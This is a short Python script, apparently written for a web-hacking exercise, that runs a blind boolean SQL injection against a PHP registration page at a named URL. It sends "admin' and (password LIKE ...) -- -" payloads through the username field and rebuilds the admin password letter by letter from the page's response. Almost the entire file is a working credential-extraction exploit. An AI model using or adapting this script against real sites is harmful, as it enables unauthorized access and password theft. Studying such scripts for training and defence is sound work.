# @author Melinda Sherrill
# Goes to website, exploits it by iterating through alphabe to get password
import requests
import sys

BASEURL = "http://frechetta.me/WebHack/php/register.php"  # Input the URL running the .php file that connects to db

SESSION = requests.Session()

TRUE = "Someone already has registered" # Look familar? go to the link above and see

# Gets session url
def postURL(url, data):
	return SESSION.post(format(url), data).text

# Sends sql injection to the query listed in the php file
def evaluateCondition(cond):
	payload = "admin' and (%s) -- -" % cond  # Does this SQL format look familar?
	response = postURL(BASEURL, {"username" : payload})

	#print response
	return TRUE in response

def exploitSQL(): # Loops SQL injection 'password LIKE y%' until password is found!
	password = ""
	alphabet = "abcdefghijklmnopqrstuvwxyz"

	query = "password LIKE "
	passthrough = False
	while(not passthrough):
		for i in alphabet:
			format = "'" + password + i + "%" + "'"
			if evaluateCondition(query + format):
				password += i
				print True;
				break;
			if i == alphabet[-1]:
				passthrough = True
	return password
	
print exploitSQL() 
